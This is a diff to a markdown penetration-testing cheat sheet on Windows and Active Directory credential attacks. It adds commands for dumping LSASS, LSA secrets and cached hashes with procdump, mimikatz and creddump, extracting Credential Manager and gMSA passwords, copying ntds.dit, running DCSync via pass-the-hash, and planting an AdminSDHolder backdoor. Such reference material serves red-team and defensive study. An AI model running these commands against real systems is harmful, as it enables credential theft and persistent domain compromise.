@@ -294,6 +294,12 @@ Commands options:
 where /r c:\ sysprep.*
 ```
 
+[findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) searches for patterns of text in files.
+
+Commands options:
+
+- **/s**: Include subdirectories
+
 ```bash
 c:\sysprep.inf # Could be clear-text credentials
 c:\sysprep\sysprep.xml # Could be Base64 encoded credentials.
@@ -438,7 +444,8 @@ WinRM is Microsoft's implementation of WS-Management in Windows which allows sys
 If you find a user, try also to use WinRM
 
 [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate.
-[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) remote shell/that lets you execute processes on remote windows systems
+
+[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) remote shell/that lets you execute processes on remote windows systems.
 
 Usage:
 
@@ -503,6 +510,8 @@ For more information about that technique refer to [T1555 - Credentials from Pas
 Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.
 
 For more information about that technique refer to [T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
+
+##### Multiple
 
 [SharpWeb](https://github.com/djhohnstein/SharpWeb) .NET 2.0 CLR compliant project that can retrieve saved logins from Google Chrome, Firefox, Internet Explorer and Microsoft Edge.
 
@@ -1309,6 +1318,24 @@ A trust is a relationship, which you establish between domains that makes it pos
     - *Transitivity*: Transitive
     - *Direction*: Can be either 1-way or 2-way
 
+###### *If you don't know, now you know: [Directory Partitions](https://docs.microsoft.com/en-us/windows/win32/ad/naming-contexts-and-partitions)*
+
+Each domain controller in a domain forest controlled by Active Directory Domain Services includes directory partitions.
+
+A directory partition is a contiguous portion of the overall directory that has independent replication scope and scheduling data.
+
+By default, the Active Directory Domain Service for an enterprise contains the following partitions:
+
+- **Schema Partition**: The schema partition contains the classSchema and attributeSchema objects that define the types of objects that can exist in the forest.
+Every domain controller in the forest has a replica of the same schema partition.
+
+- **Configuration Partition**: The configuration partition contains replication topology and other configuration data that must be replicated throughout the forest.
+Every domain controller in the forest has a replica of the same configuration partition.
+*Within this partition, we can get all domains information of the forest*
+
+- **Domain Partition**: The domain partition contains the directory objects, such as users and computers, associated with the local domain. A domain can have multiple domain controllers and a forest can have multiple domains. 
+Each domain controller stores a full replica of the domain partition for its local domain, but does not store replicas of the domain partitions for other domains.
+
 #### ASREPRoast
 
 ASREPRoast takes advantages of users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
@@ -1349,6 +1376,144 @@ Once the SSP is registered, all users who log on to the compromised Domain Contr
 
 For more information about that technique refer to [T1547.005 - Boot or Logon Autostart Execution: Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
 
+#### Cached Domain Logon Information
+
+Windows caches previous users' logon information locally so that they can log on if a logon server is unavailable during later logon attempts.
+Cached credentials cannot be used to log on elsewhere, which means no Pass-The-Hash
+
+The number of cached logins are available within the registry key *HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\\*
+
+The actual location of these cached credentials are in the registry again at *HKLM\Security\Cache*
+By default, only the SYSTEM account can view these
+
+The Metasploit module to gather those hashes is *post/windows/gather/cachedump*
+
+[creddump](https://github.com/CiscoCXSecurity/creddump7) is a python tool to extract various credentials and secrets from Windows registry hives.
+It essentially performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do, but in a platform-independent way.
+
+It currently extracts:
+
+- LM and NT hashes (SYSKEY protected)
+- Cached domain passwords
+- LSA secrets
+
+```bash
+./cachedump.py /path/to/System32/SYSTEM /path/to/System32/config/SECURITY false
+```
+
+The hashcat mode is 2100
+
+#### LSA Secrets
+
+LSA Secrets are stored in the following registry key *HKEY_LOCAL_MACHINE/Security/Policy/Secrets*
+
+By default only the SYSTEM account can access the LSA Secrets registry location.
+
+Impacket suite contains a python script that can read the contents of these registry keys and decrypt the LSA Secrets password.
+
+The Metasploit module to gather those hashes is *post/windows/gather/*
+
+[creddump](https://github.com/CiscoCXSecurity/creddump7) is a python tool to extract various credentials and secrets from Windows registry hives.
+It essentially performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do, but in a platform-independent way.
+
+It currently extracts:
+
+- LM and NT hashes (SYSKEY protected)
+- Cached domain passwords
+- LSA secrets
+
+```bash
+./lsadump.py <system hive> <security hive>
+```
+
+#### LSASS
+
+LSASS is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system.
+It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.
+
+We can use procdump to dump the memory of lsass.exe and then use mimikatz offline in order to perform
+
+```bash
+procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
+```
+
+Mimikatz can be used offline in order to read the contents of the LSASS dump and especially sections that contain logon passwords.
+
+```bash
+mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
+```
+
+##### Credential Manager
+
+Credential Manager lets you view and delete your saved credentials for signing in to websites, connected applications, and networks.
+
+All of the credentials are stored in a credentials folder which you will find at this location *%Systemdrive%\Users\\<Username>\AppData\Local\Microsoft\Credentials*
+
+Credentials saved in credential manager are of two types:
+
+- Web credentials: As Edge and widows are the product of the same company, credentials manager has access to the stored information of Edge browser too, in order to increase safekeeping of saved credentials. It also stores the password of order application provided by Microsoft such as skype, Microsoft office, etc.
+- Windows credentials: Under this category, all the windows login credentials can be found. Along with any system that is connected in the network.
+
+The following script can be used to retreive password from the credential manager.
+
+```powershell
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
+```
+
+Mimikatz can be used to retreive password from the credential manager.
+
+```bash
+mimikatz.exe
+mimikatz # privilege::debug            # Ask for debug privilege for mimikatz process.
+mimikatz # sekurlsa:logonpassword      # Under credman, you will see the password
+```
+
+LaZagne can be used to retreive password from the credential manager.
+
+```bash
+laZagne.exe
+```
+
+##### Group Managed Service Accounts
+
+The goal is to compromised one of those accounts to get their rights.
+
+The **msDS-ManagedPassword** attribute contains a BLOB with password information for group-managed service accounts.
+
+[Get-ADServiceAccount] gets a managed service account (MSA) or performs a search to retrieve MSAs.
+
+We can perform the following in order to see:
+
+- Which group(s) the SPN is member of
+- When the password will be changed, ...
+
+```powershell
+Get-ADServiceAccount -Filter {name -eq 'NAME'} -properties *
+```
+
+The **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) attribute controls who can request and receive the clear-text password.
+
+```powershell
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Filter "*" -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+ 
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+```
+
+To retreive the hash from a SPN, we can do the following using mimikatz
+
+```bash
+mimikatz.exe
+mimikatz # privilege::debug     # Ask for debug privilege for mimikatz process.
+mimikatz # sekurlsa::ekeys      #    
+```
+
+With this password hash, we can perform pass the hash to compromise the Active Directory.
+
 ###### *If you don't know, now you know: [Security Accounts Manager database](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#security-accounts-manager-database)*
 
 The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users' passwords.
@@ -1377,6 +1542,12 @@ LSASS can store credentials in multiple forms, including:
 
 LSASS is a **"cached credentials"** method
 
+###### *If you don't know, now you know: [LSA](https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication)*
+
+LSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows.
+
+LSA is designed for managing a system's local security policy, auditing, authenticating, logging users on to the system, storing private data.
+
 ###### *If you don't know, now you know: [Security Support Provider Interface](https://docs.microsoft.com/fr-fr/windows-server/security/windows-authentication/security-support-provider-interface-architecture)*
 
 The Microsoft Security Support Provider Interface (SSPI) is the foundation for Windows authentication. Applications and infrastructure services that require authentication use SSPI to provide it.
@@ -1394,6 +1565,30 @@ The following sections describe the default SSPs that interact with the SSPI. Th
 - Negotiate Extensions Security Support Provider
 - PKU2U Security Support Provider
 
+###### *If you don't know, now you know: [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)*
+
+Managed service accounts (MSAs) are a feature Microsoft first introduced in Windows Server 2008 R2 to help mitigate this risk.
+Windows Server 2012 introduces a much improved version of MSAs, called group managed service accounts (gMSAs)
+
+A **standalone Managed Service Account (sMSA)** is a managed domain account that provides automatic password management, simplified service principal name (SPN) management and the ability to delegate the management to other administrators.
+
+The **group Managed Service Account (gMSA)** provides the same functionality within the domain but also extends that functionality over multiple servers.
+
+Those are a special type of security principal that services, IIS application pools, and in some cases scheduled tasks can run as.
+Rather than having a conventional password, MSAs (and gMSAs) establish a secret with the directory and then rotate that password every 90 days (by default).
+
+###### *If you don't know, now you know: [Microsoft Directory Replication Service Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0)*
+
+The Directory Replication Service (DRS) Remote Protocol is an **RPC** protocol for replication and management of data in Active Directory.
+
+The protocol consists of two RPC interfaces:
+
+- **E3514235-4B06-11D1-AB-04-00C04FC2DCD2**: RPC interface UUID for drsuapi methods
+-> registered by every domain controller across every AD forest the same way.
+- **7c44d7d4-31d5-424c-bd5e2b3e1f323d22**: RPC interface UUID for dsaop methods
+
+Replication is used to indicate that the same directory namespace (the same objects) are copied to another directory server for redundancy and throughput reasons
+
 #### Ntds.dit file
 
 The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
@@ -1407,8 +1602,8 @@ reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
 
 For NTDS.dit we either:
 
-1) Get the domain users list and get its hashes and Kerberos keys using [MS-DRDS] DRSGetNCChanges() call, replicating just the attributes we need.
-2) Extract NTDS.dit via vssadmin executed with the smbexec approach. It's copied on the temp dir and parsed remotely.
+- Get the domain users list and get its hashes and Kerberos keys using [MS-DRDS] DRSGetNCChanges() call, replicating just the attributes we need.
+- Extract NTDS.dit via vssadmin executed with the smbexec approach. It's copied on the temp dir and parsed remotely.
 
 ```bash
 # Dump the password hashes (Requires Domain Admin rights on the target domain.)
@@ -1420,6 +1615,23 @@ secretsdump.py -system system.hive -ntds dit LOCAL
 ```
 
 If at one point the ntds.dit seems to be corrupted, use [esentutl](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875546(v=ws.11)) in order to try to repair it
+
+While running, Active Directory may maintains a file system lock on the ntds.dit file, which means simply attempting to copy it will fail.
+There are multiple ways around this constraint, however:
+
+1) Stop Active Directory, which is most likely to be detected
+2) Perform the Volume Shadow Copy Service (VSS) to snapshot the volume, and extract ntds.dit from the snapshot
+3) Use buit-in tools like NTDSUtil.exe or DSDBUtil.exe
+4) use PowerShell tools like PowerSploit's Invoke-NinjaCopy
+
+[Ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) is a command-line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS).
+
+```bash
+# - Activate Instance NTDS: Sets NTDS or a specific AD LDS instance as the active instance.
+# - IFM: Creates installation media for writable (full) and read-only domain controllers (RODCs) and instances of AD LDS.
+# This will generate a ntds.dit file to S:\Files\Active Directory\ntds.dit
+NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full S:\Files" "q" "q"
+```
 
 For more information about that technique refer to [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)
 
@@ -1519,7 +1731,7 @@ setspn -T victim.local -Q */*
 ```
 
 ```bash
-C:\Users\thomas> mimikatz.exe
+mimikatz.exe
 mimikatz # privilege::debug            # Ask for debug privilege for mimikatz process.
 mimikatz # MISC::memssp                # Inject an arbitrary SSP DLL in memory in order to interact with the LSASS process
 mimikatz # sekurlsa::logonpasswords    # Gather KRBTGT Password Information
@@ -1600,6 +1812,31 @@ mimikatz # lsadump::lsa /inject /name:krbtgt  # Gather KRBTGT Password Informati
 Now we need to create the ticket which requires (same as in the Silver Attack, except that we don't need the service)
 
 For more information about that technique refer to [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
+
+##### DCSync
+
+DCSync is a late-stage kill chain attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password data via domain replication.
+
+Here below are the stages of a DCSync attack
+
+![DCSync](DCSync.gif)
+
+Source: <https://stealthbits.com/blog/what-is-dcsync-an-introduction/>
+
+We need Administrators, Domain Admins or Enterprise Admins to perform it, as we need those rights:
+
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes In Filtered Set
+
+```bash
+# We perform a Pass-The-Hash 
+.\mimikatz.exe "privilege::debug" "sekurlsa::msv"
+.\mimikatz.exe "sekurlsa::pth /user:PrivUser1 /ntlm:eed224b4784bb040aab50b8856fe9f02 /domain:domain.com"
+# We replicate credentials from Active Directory using the krbtgt account as target for replication
+```
+
+For more information about that technique refer to [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
 
 ###### *If you don't know, now you know : [LSA Protection](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN)*
 
@@ -1682,6 +1919,61 @@ SID History enables access for another account to effectively be cloned to anoth
 
 Therefore, we don't need to update the ACLs of the resources in the old domain with the new SIDs.
 
+#### AdminSDHolder
+
+This technique requires administrative privilege in the domain.
+
+If we can manipulate AdminSDHolder, we can abuse the SDProp process in Active Directory to establish a persistent backdoor to Active Directory.
+
+Within PowerSploit, we have an cmdlet [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) which adds an ACL for a specific active directory object.
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System' -PrincipalIdentity ACCOUNT -Rights All
+```
+
+We can DCSync any account we want from the Domain Controller, even being not Domain Admin.
+
+```
+mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt /domain:DOMAIN
+```
+
+###### *If you don't know, now you know: [AdminSDHolder](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN)*
+
+Active Directory protects "protected groups" (Administrators groups members, Domain Controllers group members, krbtgt account, ...) in order to prevent privilege elevation by users
+who have been delegated rights over members of these groups.
+
+Any account/group which is or was part of a protected group has their **AdminCount** property set to 1, even if the object is moved out of that protected group.
+
+AdminSDHolder is located at "CN=AdminSDHolder,CN=System,DC=domain,DC=com"
+
+The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all “protected groups” in Active Directory and their members.
+
+Active Directory will take the ACL of the AdminSDHolder object and apply it to all protected users and groups periodically, in an effort to make sure the access to these objects is secure.
+
+The AdminSDHolder permissions are pushed down to all protected objects by a process SDProp.
+
+That means if an administrator sees an inappropriate permission on a protected object and removes it, within an hour **those permissions will be put back in place by SDProp**.
+
+#### ForeignSecurityPrincipal
+
+/ /  To Finish
+
+https://www.quest.com/community/migration-manager-for-ad/f/forum/30719/foreign-security-principal-objects-belongs-to-local-internal-domain-accounts-instead-of-trusted-external-domain-accounts
+
+###### *If you don't know, now you know : [Foreign Security Principals](https://social.technet.microsoft.com/wiki/contents/articles/51367.active-directory-foreign-security-principals-and-special-identities.aspx)*
+
+/ /  To Finish
+
+A foreign security principal (sometimes referred to by the acronym FSP) is an object created by the Active Directory system to represent a security principal in a trusted external forest.
+
+FSPs can also represent special identities, such as the "Authenticated Users" group.
+
+This allows the external security principals and special identities to be added to domain local security groups in the domain and granted permissions to resources.
+
+Get-ADObject -Filter {ObjectClass -eq 'ForeignSecurityPrincipal'}
+
+https://4sysops.com/archives/clean-up-orphaned-foreign-security-principals/
+
 ###### *If you don't know, now you know : [PAC](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjq5_blldjtAhVWwAIHHSt5Bc4QFjADegQIORAC&url=https%3A%2F%2Fwinprotocoldoc.blob.core.windows.net%2Fproductionwindowsarchives%2FMS-PAC%2F%255BMS-PAC%255D.pdf&usg=AOvVaw25ciatmnDYPnShmIg_y36q)*
 
 The Privileged Attribute Certificate (PAC) is an extension to Kerberos tickets that contains useful information about a user's privileges.
@@ -1726,7 +2018,11 @@ This vulnerability allows an attacker to abuse Windows system services to conduc
 - For the "AppInit DLLs" part, thanks to <https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/>
 - For the "Scheduled Tasks" part, thanks to <https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/>
 - For the "LAPS Evasion" part, thanks to <https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/>
-- For the "SSP Attack" part, thans to stealthbits.com <https://stealthbits.com/blog/stealing-credentials-with-a-security-support-provider-ssp/>
+- For the "SSP Attack" part, thanks to stealthbits.com <https://stealthbits.com/blog/stealing-credentials-with-a-security-support-provider-ssp/>
+- For the "Ntds.dit file" part, thanks to stealthbits.com <https://attack.stealthbits.com/ntds-dit-security-active-directory>
+- For the "Group Managed Service Accounts" part, thanks to Sean Metcalf <https://adsecurity.org/?p=4367>
+- For the "AdminSDHolder" part, thanks to harmj0y <http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/>
+- For the "Credential Manager" part, thanks to Raj Chandel <https://www.hackingarticles.in/credential-dumping-windows-credential-manager/>
 
 #### Source Todo
 
